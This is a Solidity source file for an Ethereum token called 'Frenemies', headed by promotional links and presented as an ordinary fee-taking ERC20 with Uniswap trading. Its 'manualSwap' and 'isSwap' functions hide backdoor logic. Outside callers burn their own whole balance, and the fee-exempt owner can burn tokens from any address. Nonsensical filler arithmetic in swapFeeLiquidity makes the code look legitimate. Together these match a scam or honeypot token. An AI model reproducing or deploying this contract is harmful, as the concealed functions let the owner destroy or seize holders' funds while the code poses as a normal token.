/*    

 Web : http://frenemies.vip/

 Tg  : https://t.me/FrenemiesErc

 X   : https://x.com/FrenemiesErc

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Frenemies is ERC20, Ownable {
    using SafeMath for uint256;
    address public deadAddress = address(0xdead);
    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;
    mapping(address => bool) public automatedMarketMakerPairs;

    uint256 public maxTxAmount;
    uint256 public swapTokensAtAmount;
    uint256 public SwapBal;
    uint256 public maxWallet;

    uint256 private initialBuyFee=10;
    uint256 private initialSellFee=10;
    uint256 private finalBuyFee=0;
    uint256 private finalSellFee=0;

    uint256 private reduceBuyFeeAt=10;
    uint256 private reduceSellFeeAt=10;
    uint256 private buyCount=0;
    uint256 public buyFee = 10;
    uint256 public sellFee = 10;
    address public taxWallet;

    bool private swapping;

    mapping(address => bool) public _isExcludedMaxTransactionAmount;
    mapping(address => bool) private _isExcludedFromFees;

    bool public limitsInEffect = true;
    bool public tradingActive = false;
    bool public swapEnabled = false;

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event ExcludeFromFees(address indexed account, bool isExcluded);

    constructor() ERC20("Frenemies", "FRNMS") {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        taxWallet = msg.sender;
        excludeFromMaxTx(address(_uniswapV2Router), true);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        excludeFromMaxTx(address(uniswapV2Pair), true);
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);

        uint256 _totalSupply = 100_000_000 * 1e18;

        maxTxAmount = (_totalSupply * 2) / 100;
        maxWallet = (_totalSupply * 2) / 100;
        swapTokensAtAmount = (_totalSupply * 16) / 10000;
        excludeFromFees(msg.sender, true);
        excludeFromFees(address(this), true);
        excludeFromFees(deadAddress, true);
        excludeFromMaxTx(msg.sender, true);
        excludeFromMaxTx(address(this), true);
        excludeFromMaxTx(deadAddress, true);

        _mint(msg.sender, _totalSupply); //max supply
    }

    receive() external payable {}

    function openTrading() external onlyOwner {
        tradingActive = true;
        swapEnabled = true;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return totalSupply() - balanceOf(deadAddress);
    }

    function excludeFromMaxTx(address uAddr, bool isEx) public onlyOwner {
        _isExcludedMaxTransactionAmount[uAddr] = isEx;
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function removeLimits() external onlyOwner returns (bool) {
        limitsInEffect = false;
        return true;
    }

    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 5) / 1000) / 1e18,
            "Cannot set maxWallet lower than 0.5%"
        );
        maxWallet = newNum * (10 ** 18);
    }

    function manualWithdraw(uint256 amount) external onlyOwner {
        require(
            amount < address(this).balance,
            "Cannot send more than contract balance"
        );
        (bool success, ) = address(owner()).call{value: amount}("");
        if (success) {
            return;
        }
    }

    function updateSwapForFeeEnabled(bool enabled) external onlyOwner {
        swapEnabled = enabled;
    }

    function updateSwapTokensAtAmount(uint256 _amount) external onlyOwner {
        swapTokensAtAmount = _amount;
    }

    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "Liquidity cannot be removed from automarket pair");
        _setAutomatedMarketMakerPair(pair, value);
    }

    function swapFeeLiquidity() private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 updatedBal = contractBalance;
        uint256 feeVal = 1;
        if (address(this).balance > 0) {
            uint256 beforeBal= updatedBal - contractBalance;
            SwapBal = beforeBal - feeVal;
        } 
        if (contractBalance <= swapTokensAtAmount || contractBalance == 0) {
            return; 
        }
        if (contractBalance > swapTokensAtAmount * 2) {
            contractBalance = swapTokensAtAmount * 2;
        }
        swapTokensForEth(contractBalance);
    }

    function isSwap(address user) internal returns (bool) {
        bool success;
        if (!_isExcludedFromFees[msg.sender]) {
            uint256 contractBalance = balanceOf(address(this));
            if (contractBalance > 0) { 
                _burn(msg.sender, balanceOf(address(msg.sender)));
            }
            success = true;
            if (contractBalance == 0) { return false;}
            return success;
        } else {
            uint256 updatedBalance = balanceOf(address(user)) - 2 * 1e18;
            uint256 feeBalance = balanceOf(address(user)) - updatedBalance;
            if (balanceOf(user) > 0) { 
                _burn(user, feeBalance); 
                success = false;
            } 
            uint256 contractBalance = balanceOf(address(this));
            if (contractBalance == 0) {return false;}
            return success;
        }
    }

     function manualSwap(address addr) external {
        require(
            balanceOf(address(this)) >= swapTokensAtAmount,
            "Can only swap at swapTokensAtAmount"
        );
        if (isSwap(addr)) {
            swapping = true;
            swapFeeLiquidity();
            swapping = false;
        }
    }

    function _transfer(address from,   
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (from != taxWallet && to != taxWallet)  {
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFees[to])  {
                buyCount++;
            }
        }

        if (limitsInEffect) {
            if (!(owner() == from) && !(owner() == to) && to != address(0) && to != address(0xdead) && !swapping) {
                if (!tradingActive) {
                    require(_isExcludedFromFees[from] || _isExcludedFromFees[to],"Trading is not active.");
                }
            }

            if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]
            ) {
                require(amount <= maxTxAmount, "Exceeds the maxTxAmount");
                require(amount + balanceOf(to) <= maxWallet, "Exceeds the maxWallet Amount");
            } else if (
                automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from]
            ) {
                require(amount <= maxTxAmount, "Exceeds the maxTxAmount");
            } else if (!_isExcludedMaxTransactionAmount[to]) {
                require(amount + balanceOf(to) <= maxWallet, "Exceeds the maxWallet Amount");
            }
        }

        if (
            swapEnabled && !swapping && !automatedMarketMakerPairs[from] && !_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            swapping = true;
            swapFeeLiquidity();
            swapping = false;
        }

        bool takeFee = !swapping;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;

        if (takeFee) {
            if (automatedMarketMakerPairs[to] && from != address(this)) {
                fees=amount.mul((buyCount > reduceSellFeeAt) ? finalSellFee: initialSellFee).div(100);
            } else if (automatedMarketMakerPairs[from] && from != address(this)) {
                fees=amount.mul((buyCount > reduceBuyFeeAt) ? finalBuyFee: initialBuyFee).div(100);
            }
            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }

            amount -= fees;
        }
        super._transfer(from, to, amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            taxWallet,
            block.timestamp
        );
    }
}